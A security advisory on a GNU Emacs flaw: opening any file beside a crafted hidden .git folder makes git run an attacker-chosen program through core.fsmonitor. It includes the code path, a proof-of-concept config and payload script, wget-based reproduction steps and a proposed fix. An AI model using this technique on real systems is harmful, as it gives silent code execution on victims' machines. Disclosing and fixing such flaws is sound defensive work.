# GNU Emacs: Multiple Remote Code Execution Vectors on File Open

## Summary

Opening a file in GNU Emacs can trigger arbitrary code execution through
version control (git), most requiring **zero user interaction**
beyond the file open itself. The most severe finding requires no
file-local variables at all - simply opening any file inside a directory
containing a crafted `.git/` folder executes attacker-controlled commands.

**Date:** 2026-03-29
**Tested on:** 
 - GNU Emacs 31.0.50 (master branch, commit 0c961b7778a)
 - GNU Emacs 30.2 (build 1, aarch64-apple-darwin23.2.0, NS appkit-2487.30 Version 14.2 (Build 23C64))

---

## Technical Details

`vc-refresh-state` is unconditionally registered in `find-file-hook`
(vc-hooks.el:1005). When any file is opened, Emacs checks whether it
resides in a version-controlled directory. For git repositories, this
executes `git ls-files` (vc-git.el:312) and `git status` (vc-git.el:411)
via `process-file`.

Git reads `.git/config` before executing any command. The `core.fsmonitor`
option instructs git to execute an arbitrary program to query file-system
changes. This program runs as the user, with no sandboxing.

### Attack Scenario

An attacker distributes an archive (zip, tarball) containing a hidden .git folder:

```
project/
  .git/
    config                 ← core.fsmonitor = .git/hooks/payload
    hooks/payload          ← #!/bin/sh  <arbitrary commands>
    HEAD, objects/, refs/  ← minimal valid repo structure
  README.txt               ← completely normal plain text
```

The victim extracts the archive and opens `README.txt` in Emacs.
The file itself contains **no local variables, no eval forms, no mode
specifications** - it is pure plain text. The attack is entirely in
the hidden `.git/` directory.

### Code Path

```
find-file "README.txt"
│
│ files.el:2802   find-file-noselect-1 → after-find-file
│ files.el:2976     (run-hooks 'find-file-hook)
│
▼
vc-hooks.el:1005  (add-hook 'find-file-hook #'vc-refresh-state)  ← ALWAYS REGISTERED
│
▼
vc-hooks.el:950   vc-refresh-state: (when buffer-file-name ...)  ← any file with a name
│
├─vc-hooks.el:957   (vc-backend buffer-file-name)
│ │
│ └─vc-hooks.el:450   (vc-registered file)
│   │
│   └─vc-hooks.el:417   (mapc (lambda (b) (vc-call-backend b 'registered file))
│     │                        vc-handled-backends)
│     │                  tries: Git, Hg, SVN, RCS, CVS, SCCS, SRC, Bzr
│     │
│     └─vc-git.el:292   vc-git-registered(file)
│       │
│       ├─vc-git.el:294   (vc-git-root file)                    
│       │  └─vc-git.el:2553  (vc-find-root file ".git")
│       │
│       ├─vc-git.el:302   (executable-find "git" t)   ← git binary exists?
│       │
│       └─vc-git.el:312   (vc-git--out-ok "ls-files" "-c" "-z" "--" name)
│         └─vc-git.el:2978  (vc-git--call nil '(t nil) "ls-files" ...)
│           └─vc-git.el:2972  (process-file "git" nil (t nil) nil
│                               "--no-pager" "ls-files" "-c" "-z" "--" "README.txt")
│
│                              git reads project/.git/config  ← ATTACKER CONTROLLED
│                              sees: core.fsmonitor = .git/hooks/payload  
|                              => EXECUTES .git/hooks/payload
```

## Steps to Reproduce

Verified on Emacs 31.0.50, git 2.39.5:
```bash
wget https://github.com/califio/publications/raw/refs/heads/main/MADBugs/vim-vs-emacs-vs-claude/emacs-poc.tgz
tar -xzpvf emacs-poc.tgz
emacs emacs-poc/a.txt
cat /tmp/pwned
```
File contents:
```sh
#.git/config
[core]
  ...
  fsmonitor = .git/a
  
#.git/a
#!/bin/sh
echo pwned:$(date)>>/tmp/pwned
```

### Impact

- Full arbitrary command execution as the Emacs user
- No Emacs prompt or confirmation dialog
- No file-local variables or eval forms needed
- Works with default Emacs configuration
- Attack vector: archives, shared drives, email attachments
- The `.git/` directory is hidden by default on Unix systems

### Proposed Fix

**Recommended: Pass `-c` overrides in `vc-git--call` for all options
that can be neutralized by name.**

```elisp
// lisp/vc/vc-git.el
2972      (apply #'process-file vc-git-program infile buffer nil
2973 -           "--no-pager" command args)))
2973 +           "--no-pager"
2974 +           "-c" "core.fsmonitor=false"
2975 +           command args)))   
```

This was tested and confirmed to block `core.fsmonitor`.

## Disclosure Timeline

- **2026-03-28:** Vulnerability identified using Claude
- **2026-03-28:** Reported to GNU Emacs maintainers via email
- **2026-03-30:** Maintainers declined to address the issue, attributing it to Git
- **2026-03-30:** Public disclosure made

## Credits

Hung Nguyen (movrment) from Calif.io

## References

- [Git honours embedded bare repos, and exploitation via core.fsmonitor in a directory's .git/config affects IDEs, shell prompts and Git pillagers
](https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md)
- [Securing Developer Tools: Git Integrations](https://www.sonarsource.com/blog/securing-developer-tools-git-integrations)
